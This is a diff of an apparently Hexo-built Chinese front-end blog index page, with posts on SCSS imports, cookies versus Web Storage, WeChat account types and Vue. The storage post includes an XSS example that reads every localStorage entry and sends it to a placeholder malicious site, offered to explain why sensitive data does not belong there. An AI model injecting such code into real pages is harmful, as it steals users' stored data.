+<h3 id="在app-scss种引入index-scss等这些scss文件"><a href="#在app-scss种引入index-scss等这些scss文件" class="headerlink" title="在app.scss种引入index.scss等这些scss文件"></a>在app.scss种引入index.scss等这些scss文件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">@charset <span class="string">"UTF-8"</span>;</div><div class="line"></div><div class="line">@<span class="keyword">import</span> <span class="string">"./utils/common.util.scss"</span>;</div><div class="line"></div><div class="line">@<span class="keyword">import</span> <span class="string">"./utils/reset.scss"</span>;</div><div class="line"></div><div class="line">@<span class="keyword">import</span> <span class="string">"./modules/layout.scss"</span>;</div><div class="line"></div><div class="line">@<span class="keyword">import</span> <span class="string">"./modules/index.scss"</span>;</div></pre></td></tr></table></figure>
+<h3 id="使用fekit启动服务-我们就可以运行以上代码-日后如果发线上-我们可以压缩一下，这样会产生prd文件夹-其他人看不到我们的src文件夹下编写的内容"><a href="#使用fekit启动服务-我们就可以运行以上代码-日后如果发线上-我们可以压缩一下，这样会产生prd文件夹-其他人看不到我们的src文件夹下编写的内容" class="headerlink" title="使用fekit启动服务 我们就可以运行以上代码 日后如果发线上 我们可以压缩一下，这样会产生prd文件夹 其他人看不到我们的src文件夹下编写的内容"></a>使用fekit启动服务 我们就可以运行以上代码 日后如果发线上 我们可以压缩一下，这样会产生prd文件夹 其他人看不到我们的src文件夹下编写的内容</h3><hr>
+<h2 id="大家可以去我的网站上下载源码"><a href="#大家可以去我的网站上下载源码" class="headerlink" title="大家可以去我的网站上下载源码"></a>大家可以去我的网站上下载源码</h2><p><a href="https://github.com/chongbenben/fekit-mobile-app" target="_blank" rel="external">https://github.com/chongbenben/fekit-mobile-app</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-水平垂直居中" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -386,6 +623,261 @@
 
 
   
+    <article id="post-cookiewebstorage" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/03/30/cookiewebstorage/" class="article-date">
+      <time datetime="2016-03-30T10:09:04.000Z" itemprop="datePublished">2016-03-30</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/03/30/cookiewebstorage/">Cookie、localStorage、sessionStorage</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="sessionStorage、localStorage、cookie都是在浏览器端存储的数据"><a href="#sessionStorage、localStorage、cookie都是在浏览器端存储的数据" class="headerlink" title="sessionStorage、localStorage、cookie都是在浏览器端存储的数据"></a>sessionStorage、localStorage、cookie都是在浏览器端存储的数据</h2><p>HTML5本地存储的前身就是Cookie，HTML5的本地存储是使localStorage对象将WEB数据持久化在本地。其中sessionStorage的概念很特别，引入了一个“浏览器窗口”的概念。sessionStorage是在同源的同窗口（或tab）中，始终存在的数据。也就是说只要这个浏览器窗口没有关闭，即使刷新页面或进入同源另一页面，数据仍然存在。关闭窗口后，sessionStorage即被销毁。</p>
+<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><h3 id="cookie的优点、缺点"><a href="#cookie的优点、缺点" class="headerlink" title="cookie的优点、缺点"></a>cookie的优点、缺点</h3><h4 id="优点【Advantages】"><a href="#优点【Advantages】" class="headerlink" title="优点【Advantages】"></a>优点【Advantages】</h4><blockquote>
+<p>极高的扩展性和可用性</p>
+</blockquote>
+<ol>
+<li>通过良好的编程，控制保存在cookie中的session对象的大小。</li>
+<li>通过加密和安全传输技术【SSL】，减少cookie被破解的可能性。</li>
+<li>只在cookie中存放不敏感数据，即使被盗也不会有重大损失。</li>
+<li><p>控制cookie的生命期，使之不会永远有效。偷盗者很可能拿到一个过期的cookie。</p>
+<h4 id="缺点【Disadvantages】"><a href="#缺点【Disadvantages】" class="headerlink" title="缺点【Disadvantages】"></a>缺点【Disadvantages】</h4></li>
+<li><p>Cookie数量和长度的限制。每个domain最多只能有20条cookie，每个cookie长度不能超过4KB，否则会被截掉。</p>
+</li>
+<li>安全性问题。如果cookie被人拦截了，那人就可以取得所有的session信息。即使加密也与事无补，因为拦截者并不需要知道cookie的意义，他只要原样转发cookie就可以达到目的了。</li>
+<li>有些状态不可能保存在客户端。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。</li>
+</ol>
+<h2 id="浏览器本地存储webstorage"><a href="#浏览器本地存储webstorage" class="headerlink" title="浏览器本地存储webstorage"></a>浏览器本地存储webstorage</h2><p>在较高版本的浏览器中，js提供了sessionStorage和globalStorage。在HTML5中提供了localStorage来取代globalStorage。</p>
+<p>html5中的Web Storage包括了两种存储方式：sessionStorage和localStorage。</p>
+<p>sessionStorage用于本地存储一个会话【session】中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。因此sessionStorage不是一种持久化的本地存储，仅仅是会话级别的存储。</p>
+<p>而localStorage用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。</p>
+<h4 id="Web-Storage带来的好处："><a href="#Web-Storage带来的好处：" class="headerlink" title="Web Storage带来的好处："></a>Web Storage带来的好处：</h4><ul>
+<li>减少网络流量：一旦数据保存在本地后，就可以避免再向服务器请求数据，因此减少不必要的数据请求，减少数据在浏览器和服务器间不必要地来回传递。</li>
+<li>快速显示数据：性能好，从本地读数据比通过网络从服务器获得数据快得多，本地数据可以即时获得。再加上网页本身也可以有缓存，因此整个页面和数据都在本地的话，可以立即显示。</li>
+<li>临时存储：很多时候数据只需要在用户浏览一组页面期间使用，关闭窗口后数据就可以丢弃了，这种情况使用sessionStorage非常方便。</li>
+</ul>
+<h2 id="web-storage和cookie的区别"><a href="#web-storage和cookie的区别" class="headerlink" title="web storage和cookie的区别"></a>web storage和cookie的区别</h2><p>先说一下共同点：都是保存在浏览器端，且同源的。</p>
+<p>Web Storage的概念和cookie相似，区别是它是为了更大容量存储设计的。Cookie的大小是受限的，并且每次你请求一个新的页面的时候Cookie都会被发送过去，这样无形中浪费了带宽，另外cookie还需要指定作用域，不可以跨域调用。</p>
+<p>除此之外，Web Storage拥有setItem,getItem,removeItem,clear等方法，不像cookie需要前端开发者自己封装setCookie，getCookie。</p>
+<p>但是cookie也是不可以或缺的：<strong>cookie的作用</strong>是与服务器进行交互，作为HTTP规范的一部分而存在 ，而Web Storage仅仅是为了在本地“存储”数据而生</p>
+<p>浏览器的支持除了IE７及以下不支持外，其他标准浏览器都完全支持(ie及FF需在web服务器里运行)，值得一提的是IE总是办好事，例如IE7、IE6中的userData其实就是javascript本地存储的解决方案。通过简单的代码封装可以统一到所有的浏览器都支持web storage。</p>
+<p>localStorage和sessionStorage都具有相同的操作方法，例如setItem、getItem和removeItem等。</p>
+<h3 id="为什么选择Web-Storage而不是Cookie？"><a href="#为什么选择Web-Storage而不是Cookie？" class="headerlink" title="为什么选择Web Storage而不是Cookie？"></a>为什么选择Web Storage而不是Cookie？</h3><p>与Cookie相比，Web Storage存在不少的优势，概括为以下几点：</p>
+<ol>
+<li><p>存储空间更大：IE8下每个独立的存储空间为10M，其他浏览器实现略有不同，但都比Cookie要大很多。</p>
+</li>
+<li><p>存储内容不会发送到服务器：当设置了Cookie后，Cookie的内容会随着请求一并发送的服务器，这对于本地存储的数据是一种带宽浪费。而Web Storage中的数据则仅仅是存在本地，不会与服务器发生任何交互。</p>
+</li>
+<li><p>更多丰富易用的接口：Web Storage提供了一套更为丰富的接口，使得数据操作更为简便。</p>
+</li>
+<li><p>独立的存储空间：每个域（包括子域）有独立的存储空间，各个存储空间是完全独立的，因此不会造成数据混乱。</p>
+</li>
+</ol>
+<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>因为考虑到每个 HTTP 请求都会带着 Cookie 的信息，所以 Cookie 当然是能精简就精简啦，比较常用的一个应用场景就是判断用户是否登录。<br>针对登录过的用户，服务器端会在他登录时往 Cookie 中插入一段加密过的唯一辨识单一用户的辨识码，下次只要读取这个值就可以判断当前用户是否登录啦。<br>曾经还使用 Cookie 来保存用户在电商网站的购物车信息，如今有了 localStorage，就可以利用localStorage代替cookie了。<br>而另一方面 localStorage 接替了 Cookie 管理购物车的工作，同时也能胜任其他一些工作。比如Html5游戏通常会产生一些本地数据，localStorage 也是非常适用的。如果遇到一些内容特别多的表单，为了优化用户体验，我们可能要把表单页面拆分成多个子页面，然后按步骤引导用户填写。这时候 sessionStorage 的作用就发挥出来了。</p>
+<h2 id="安全性的考虑"><a href="#安全性的考虑" class="headerlink" title="安全性的考虑"></a>安全性的考虑</h2><p>需要注意的是，不是什么数据都适合放在 Cookie、localStorage 和 sessionStorage 中的。使用它们的时候，<br>需要时刻注意是否有代码存在 XSS 注入的风险。因为只要打开控制台，你就随意修改它们的值，也就是说如果你的网站中有 XSS 的风险，<br>它们就能对你的 localStorage 肆意妄为。所以千万不要用它们存储你系统中的敏感数据。但是cookie可以采取一些策略来预防XSS攻击。 </p>
+<p>那么</p>
+<h2 id="是否可以代替Cookie"><a href="#是否可以代替Cookie" class="headerlink" title="是否可以代替Cookie"></a>是否可以代替Cookie</h2><p>浏览器使用Cookie进行身份验证已经好多年，那现在既然localStorage存储空间那么大，是否可以把身份验证的数据直接移植过来呢。以现在来看，把身份验证数据使用localStorage进行存储还不太成熟。我们知道，通常可以使用XSS漏洞来获取到Cookie，然后用这个Cookie进行身份验证登录。后来为了防止通过XSS获取Cookie数据，浏览器支持了使用HTTPONLY来保护Cookie不被XSS攻击获取到。而localStorage存储没有对XSS攻击有任何的抵御机制。一旦出现XSS漏洞，那么存储在localStorage里的数据就极易被获取到。 </p>
+<p>如果一个网站存在XSS漏洞，那么攻击者注入如下代码，就可以获取使用localStorage存储在本地的所有信息。<br>Js代码</p>
+<pre><code>var i = 0;  
+var str = &quot;&quot;;  
+while (localStorage.key(i) != null)  
+{  
+    var key = localStorage.key(i);   
+    str += key + &quot;: &quot; + localStorage.getItem(key);  
+    i++;  
+}  
+document.location=&quot;http://your-malicious-site.com?stolen=&quot;+ str;  
+</code></pre><p>攻击者也可以简单的使用localStorage.removeItem(key)和localStorage.clear()对存储数据进行清空。  </p>
+<p>####最后推荐几篇文章：<br><a href="http://zccst.iteye.com/blog/2194344" target="_blank" rel="external">http://zccst.iteye.com/blog/2194344</a></p>
+<p><a href="http://mp.weixin.qq.com/s?__biz=MzAwNzgxMjYzMA==&amp;mid=401640151&amp;idx=1&amp;sn=7057582917c3c477c55e7deb74a83e88#rd&amp;utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">http://mp.weixin.qq.com/s?__biz=MzAwNzgxMjYzMA==&amp;amp</a></p>
+<p><a href="http://blog.csdn.net/cwzhsi/article/details/49557879" target="_blank" rel="external">http://blog.csdn.net/cwzhsi/article/details/49557879</a></p>
+<hr>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-wexinhao" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/01/22/wexinhao/" class="article-date">
+      <time datetime="2016-01-22T14:33:18.000Z" itemprop="datePublished">2016-01-22</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/01/22/wexinhao/">微信公众号的区别</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="服务号、订阅号、企业号的介绍（区别）"><a href="#服务号、订阅号、企业号的介绍（区别）" class="headerlink" title="服务号、订阅号、企业号的介绍（区别）"></a>服务号、订阅号、企业号的介绍（区别）</h3><ol>
+<li>订阅号：主要偏于为用户传达资讯（类似报纸杂志），认证前后都是每天只可以群发一条消息；</li>
+<li>服务号：主要偏于服务交互（类似银行，114，提供服务查询），认证前后都是每个月可群发4条消息；</li>
+<li>企业号：主要用于公司内部通讯使用，需要先有成员的通讯信息验证才可以关注成功企业号；</li>
+</ol>
+<h3 id="温馨提示："><a href="#温馨提示：" class="headerlink" title="温馨提示："></a>温馨提示：</h3><ol>
+<li>如果想简单的发送消息，达到宣传效果，建议可选择订阅号；</li>
+<li>如果想进行商品销售，进行商品售卖，建议可申请服务号；</li>
+<li>如果想用来管理内部企业员工、团队，对内使用，可申请企业号。</li>
+<li>订阅号可通过微信认证资质审核通过后有一次升级为服务号的入口，升级成功后类型不可再变。</li>
+<li>服务号不可变更成订阅号。</li>
+</ol>
+<p><img src="wexinhao/b258f5c4b74543a98f7e1fa81d178a82b9011429.jpg" alt=""></p>
+<p><img src="wexinhao/ea85a94543a98226c27dcf438982b9014b90ebd3.jpg" alt=""></p>
+<p><img src="wexinhao/0ef2112442a7d9333e920317ae4bd11373f00159.jpg" alt=""></p>
+<p><img src="wexinhao/5af4d7ea15ce36d3b378645439f33a87e950b113.jpg" alt=""></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-vue常用" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2015/11/19/vue常用/" class="article-date">
+      <time datetime="2015-11-19T05:16:06.000Z" itemprop="datePublished">2015-11-19</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/11/19/vue常用/">vue</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <p>Vue.js（读音 /vjuː/, 类似于 view） 是一套构建用户界面的 渐进式框架。与其他重量级框架不同的是，Vue 采用自底向上增量开发的设计。Vue 的核心库只关注视图层，并且非常容易学习，非常容易与其它库或已有项目整合。另一方面，Vue 完全有能力驱动采用单文件组件和Vue生态系统支持的库开发的复杂单页应用。</p>
+<h1 id="UI库用yo-用style文件夹里面的两个目录"><a href="#UI库用yo-用style文件夹里面的两个目录" class="headerlink" title="UI库用yo 用style文件夹里面的两个目录"></a>UI库用yo 用style文件夹里面的两个目录</h1><p>usage -&gt;page-&gt;app.scss<br>
+          
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/Vue相关实践/">Vue相关实践</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/yo-vue-vuex-webpack/">yo+vue+vuex+webpack</a></li></ul>
+    </div>
+
+      
+        <p class="article-more-link">
+          <a href="/2015/11/19/vue常用/#more">more >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-gulp实现前端工程化" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -454,11 +946,11 @@
 
 
   
-    <article id="post-BFC" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-移动端小问题" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2014/12/23/BFC/" class="article-date">
-      <time datetime="2014-12-23T13:25:02.000Z" itemprop="datePublished">2014-12-23</time>
+      <a href="/2015/01/10/移动端小问题/" class="article-date">
+      <time datetime="2015-01-10T03:39:00.000Z" itemprop="datePublished">2015-01-10</time>
 </a>
 
 
@@ -473,7 +965,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2014/12/23/BFC/">到底什么是BFC</a>
+      <a class="article-title" href="/2015/01/10/移动端小问题/">移动端常见错误</a>
     </h1>
   
 
@@ -483,157 +975,28 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><strong>如何利用BFC解决问题？BFC是什么？</strong>  </p>
-<h2 id="一、BFC是什么？"><a href="#一、BFC是什么？" class="headerlink" title="一、BFC是什么？"></a>一、BFC是什么？</h2><p>在解释 BFC 是什么之前，需要先介绍 Box、Formatting Context的概念。   </p>
-<ul>
-<li><strong>Box: CSS布局的基本单位</strong></li>
-</ul>
-<p>Box 是 CSS 布局的对象和基本单位， 直观点来说，就是一个页面是由很多个 Box 组成的。元素的类型和 display 属性，决定了这个 Box 的类型。 不同类型的 Box， 会参与不同的 Formatting Context（一个决定如何渲染文档的容器），因此Box内的元素会以不同的方式渲染。让我们看看有哪些盒子：  </p>
-<blockquote>
-<p>block-level box:display 属性为 block, list-item, table 的元素，会生成 block-level box。并且参与 block fomatting context；<br>inline-level box:display 属性为 inline, inline-block, inline-table 的元素，会生成 inline-level box。并且参与 inline formatting context</p>
-</blockquote>
-<ul>
-<li><strong>Formatting context</strong></li>
-</ul>
-<p>Formatting context 是 W3C CSS2.1 规范中的一个概念。它是页面中的一块渲染区域，并且有一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用。最常见的 Formatting context 有 Block fomatting context (简称BFC)和 Inline formatting context (简称IFC)。</p>
-<p>　　CSS2.1 中只有 BFC 和 IFC, CSS3 中还增加了 GFC 和 FFC。</p>
-<h4 id="BFC-定义"><a href="#BFC-定义" class="headerlink" title="BFC 定义"></a>BFC 定义</h4><p>BFC(Block formatting context)直译为<strong>“块级格式化上下文”</strong>。它是一个独立的渲染区域，只有Block-level box参与， 它规定了内部的Block-level Box如何布局，并且与这个区域外部毫不相干。</p>
-<h4 id="BFC布局规则："><a href="#BFC布局规则：" class="headerlink" title="BFC布局规则："></a>BFC布局规则：</h4><ol>
-<li>内部的Box会在垂直方向，一个接一个地放置。</li>
-<li>Box垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠.</li>
-<li>每个元素的margin box的左边， 与包含块border box的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此。</li>
-<li>BFC的区域不会与float box重叠。</li>
-<li>BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。</li>
-<li>计算BFC的高度时，浮动元素也参与计算。<h2 id="二、哪些元素会生成BFC"><a href="#二、哪些元素会生成BFC" class="headerlink" title="二、哪些元素会生成BFC?"></a>二、哪些元素会生成BFC?</h2></li>
-<li>根元素</li>
-<li>float属性不为none</li>
-<li>position为absolute或fixed</li>
-<li>display为inline-block, table-cell, table-caption, flex,   inline-flex</li>
-<li>overflow不为visible<h2 id="三、BFC的作用及原理"><a href="#三、BFC的作用及原理" class="headerlink" title="三、BFC的作用及原理"></a>三、BFC的作用及原理</h2><h4 id="1-自适应两栏布局"><a href="#1-自适应两栏布局" class="headerlink" title="1. 自适应两栏布局"></a>1. 自适应两栏布局</h4>　代码:    </li>
-</ol>
-<pre><code>&lt;style&gt;
-    body {
-        width: 300px;
-           position: relative;
-    }
-    .aside {
-        width: 100px;
-           height: 150px;
-        float: left;
-        background: #f66;
-    }
-    .main {
-           height: 200px;
-        background: #fcc;
-    }
-&lt;/style&gt;
-&lt;body&gt;
-    &lt;div class=&quot;aside&quot;&gt;&lt;/div&gt;
-    &lt;div class=&quot;main&quot;&gt;&lt;/div&gt;
-&lt;/body&gt;
-</code></pre><p>页面：<br><img src="BFC/4dca44a927d4c1ffc30e3ae5f53a0b79.png" alt=""><br>根据BFC布局规则第3条：</p>
-<blockquote>
-<p>每个元素的margin box的左边， 与包含块border box的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此。</p>
-</blockquote>
-<p>因此，虽然存在浮动的元素aside，但main的左边依然会与包含块的左边相接触。</p>
-<p>根据BFC布局规则第四条：</p>
-<blockquote>
-<p>BFC的区域不会与float box重叠。</p>
-</blockquote>
-<p>我们可以通过触发main生成BFC， 来实现自适应两栏布局。   </p>
-<pre><code>.main{
-    overflow:hidden;
-}
-</code></pre><p>当触发main生成BFC后，这个新的BFC不会与浮动的aside重叠。因此会根据包含块的宽度，和aside的宽度，自动变窄。效果如下：<br><img src="BFC/t01077886a9706cb26b.png" alt=""></p>
-<h4 id="2-清除内部浮动"><a href="#2-清除内部浮动" class="headerlink" title="2.清除内部浮动"></a>2.清除内部浮动</h4><p>代码：</p>
-<pre><code>&lt;style&gt;
-    .par {
-        border: 5px solid #fcc;
-        width: 300px;
-    }
-    .child {
-        border: 5px solid #f66;
-        width:100px;
-        height: 100px;
-        float: left;
-    }
-&lt;/style&gt;
-&lt;body&gt;
-    &lt;div class=&quot;par&quot;&gt;
-        &lt;div class=&quot;child&quot;&gt;&lt;/div&gt;
-        &lt;div class=&quot;child&quot;&gt;&lt;/div&gt;
-    &lt;/div&gt;
-&lt;/body&gt;
-</code></pre><p>页面：</p>
-<p><img src="BFC/t01077886a9706cb26b.png" alt=""></p>
-<p>根据BFC布局规则第六条：</p>
-<blockquote>
-<p>计算BFC的高度时，浮动元素也参与计算</p>
-</blockquote>
-<p>为达到清除内部浮动，我们可以触发par生成BFC，那么par在计算高度时，par内部的浮动元素child也会参与计算。</p>
-<p>代码：</p>
-<pre><code>.par {
-    overflow: hidden;
-}
-</code></pre><p>效果如下:</p>
-<p><img src="BFC/t016bbbe5236ef1ffd5.png" alt=""></p>
-<h4 id="3-防止垂直-margin-重叠"><a href="#3-防止垂直-margin-重叠" class="headerlink" title="　3. 防止垂直 margin 重叠"></a>　3. 防止垂直 margin 重叠</h4><p>代码：</p>
-<pre><code>&lt;style&gt;
-    p {
-        color: #f55;
-        background: #fcc;
-        width: 200px;
-        line-height: 100px;
-        text-align:center;
-        margin: 100px;
-    }
-&lt;/style&gt;
-&lt;body&gt;
-    &lt;p&gt;Haha&lt;/p&gt;
-    &lt;p&gt;Hehe&lt;/p&gt;
-&lt;/body&gt;
-</code></pre><p>　页面：</p>
-<p><img src="BFC/t01b47b8b7d153c07cc.png" alt=""></p>
-<p>两个p之间的距离为100px，发送了margin重叠。</p>
-<p>根据BFC布局规则第二条：</p>
-<blockquote>
-<p>Box垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠</p>
-</blockquote>
-<p>我们可以在p外面包裹一层容器，并触发该容器生成一个BFC。那么两个P便不属于同一个BFC，就不会发生margin重叠了。<br>代码：</p>
-<pre><code>&lt;style&gt;
-    .wrap {
-        overflow: hidden;
-    }
-    p {
-        color: #f55;
-        background: #fcc;
-        width: 200px;
-        line-height: 100px;
-        text-align:center;
-        margin: 100px;
-    }
-&lt;/style&gt;
-&lt;body&gt;
-    &lt;p&gt;Haha&lt;/p&gt;
-    &lt;div class=&quot;wrap&quot;&gt;
-        &lt;p&gt;Hehe&lt;/p&gt;
-    &lt;/div&gt;
-&lt;/body&gt;
-</code></pre><p>效果如下:<br><img src="BFC/t0118d1d2badbb00521.png" alt=""></p>
-<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>其实以上的几个例子都体现了BFC布局规则第五条：</p>
-<blockquote>
-<p>BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。</p>
-</blockquote>
-<p>因为BFC内部的元素和外部的元素绝对不会互相影响，因此， 当BFC外部存在浮动时，它不应该影响BFC内部Box的布局，BFC会通过变窄，而不与浮动有重叠。同样的，当BFC内部有浮动时，为了不影响外部元素的布局，BFC计算高度时会包括浮动的高度。避免margin重叠也是这样的一个道理。</p>
-
+              <p>移动端开发常见问题<br>
+          
       
     </div>
     
     <div class="article-info article-info-index">
       
       
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/移动端开发/">移动端开发</a>
+    </div>
+
 
       
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/移动端常见错误/">移动端常见错误</a></li></ul>
+    </div>
+
+      
+        <p class="article-more-link">
+          <a href="/2015/01/10/移动端小问题/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -651,208 +1014,10 @@
 
 
   
-    <article id="post-git" class="article article-type-post" itemscope itemprop="blogPost">
   
-    <div class="article-meta">
-      <a href="/2014/12/18/git/" class="article-date">
-      <time datetime="2014-12-18T13:19:27.000Z" itemprop="datePublished">2014-12-18</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2014/12/18/git/">Git与SVN的区别</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h3 id="1、Git是分布式版本控制系统，SVN是集中式版本控制系统："><a href="#1、Git是分布式版本控制系统，SVN是集中式版本控制系统：" class="headerlink" title="1、Git是分布式版本控制系统，SVN是集中式版本控制系统："></a>1、Git是分布式版本控制系统，SVN是集中式版本控制系统：</h3><p>这是最核心的区别。好处是跟其他同事不会有太多的冲突，自己写的代码放在自己电脑上，一段时间后再提交、合并，也可以不用联网在本地提交；Git并不是目前第一个或唯一的分布式版本控制系统。还有一些系统，例如Bitkeeper, Mercurial等，也是运行在分布式模式上的。但Git在这方面做的更好，而且有更多强大的功能特征。</p>
-<p>Git跟SVN一样有自己的 集中式版本库或服务器。但，Git更倾向于被使用于分布式模式，也就是每个开发人员从中心版本库/服务器上chect out代码后会在自己的机器上克隆一个自己的版本库。可以这样说，如果你被困在一个不能连接网络的地方时，你仍然能够提交文件，查看历史版本记录，创建项 目分支等。</p>
-<p>Git需要建两个Repositories(Local Repositories &amp; Remote Repositories),指令很多，除此之外你需要知道哪些指令在Local Repository，哪些指令在Remote Repository。</p>
-<h3 id="2、Git把内容按元数据方式存储，而SVN是按文件："><a href="#2、Git把内容按元数据方式存储，而SVN是按文件：" class="headerlink" title="2、Git把内容按元数据方式存储，而SVN是按文件："></a>2、Git把内容按元数据方式存储，而SVN是按文件：</h3><p>如果你把.git目录的体积大小跟.svn比较，你会发现它们差距很大。因 为,.git目录是处于你的机器上的一个克隆版的版本库，它拥有中心版本库上所有的东西，例如标签，分支，版本记录等。</p>
-<h3 id="3、Git没有一个全局版本号，而SVN有："><a href="#3、Git没有一个全局版本号，而SVN有：" class="headerlink" title="3、Git没有一个全局版本号，而SVN有："></a>3、Git没有一个全局版本号，而SVN有：</h3><p>目前为止这是跟SVN相比GIT缺少的最大的一个特征。</p>
-<h3 id="4、Git的内容的完整性要优于SVN"><a href="#4、Git的内容的完整性要优于SVN" class="headerlink" title="4、Git的内容的完整性要优于SVN:"></a>4、Git的内容的完整性要优于SVN:</h3><p> GIT的内容存储使用的是SHA-1哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。</p>
-<h3 id="5、Git下载下来后，在本地不必联网就可以看到所有的log，很方便学习，SVN却需要联网"><a href="#5、Git下载下来后，在本地不必联网就可以看到所有的log，很方便学习，SVN却需要联网" class="headerlink" title="5、Git下载下来后，在本地不必联网就可以看到所有的log，很方便学习，SVN却需要联网"></a>5、Git下载下来后，在本地不必联网就可以看到所有的log，很方便学习，SVN却需要联网</h3><h3 id="6、版本库（repository"><a href="#6、版本库（repository" class="headerlink" title="6、版本库（repository):"></a>6、版本库（repository):</h3><p>SVN只能有一个指定中央版本库。当这个中央版本库有问题时，所有工作成员都一起瘫痪直到版本库维修完毕或者新的版本库设立完成。而 Git可以有无限个版本库。或者，更正确的说法，每一个Git都是一个版本库，区别是它们是否拥有活跃目录（Git Working Tree）。如果主要版本库（例如：置於GitHub的版本库）发生了什麼事，工作成员仍然可以在自己的本地版本库（local repository）提交，等待主要版本库恢复即可。工作成员也可以提交到其他的版本库！</p>
-<h3 id="7、分支（Branch）"><a href="#7、分支（Branch）" class="headerlink" title="7、分支（Branch）"></a>7、分支（Branch）</h3><p>在SVN，分支是一个完整的目录。且这个目录拥有完整的实际文件。如果工作成员想要开啟新的分支，那将会影响“全世界”！每个人都会拥有和你一样的分支。如果你的分支是用来进行破坏工作（安检测试），那将会像传染病一样,你改一个分支，还得让其他人重新切分支重新下载，十分狗血。而 Git，每个工作成员可以任意在自己的本地版本库开啟无限个分支。举例：当我想尝试破坏自己的程序（安检测试），并且想保留这些被修改的文件供日后使用， 我可以开一个分支，做我喜欢的事。完全不需担心妨碍其他工作成员。只要我不合并及提交到主要版本库，没有一个工作成员会被影响。等到我不需要这个分支时， 我只要把它从我的本地版本库删除即可。无痛无痒。</p>
-<h3 id="8、提交（Commit）"><a href="#8、提交（Commit）" class="headerlink" title="8、提交（Commit）"></a>8、提交（Commit）</h3><p>在SVN，当你提交你的完成品时，它将直接记录到中央版本库。当你发现你的完成品存在严重问题时，你已经无法阻止事情的发生了。如果网路中断，你根本没办法提交！而Git的提交完全属於本地版本库的活动。而你只需“推”（git push）到主要版本库即可。Git的“推”其实是在执行“同步”（Sync）。</p>
-<h4 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h4><ol>
-<li><a href="http://blog.csdn.net/bruce_6/article/details/38299677" target="_blank" rel="external">http://blog.csdn.net/bruce_6/article/details/38299677</a></li>
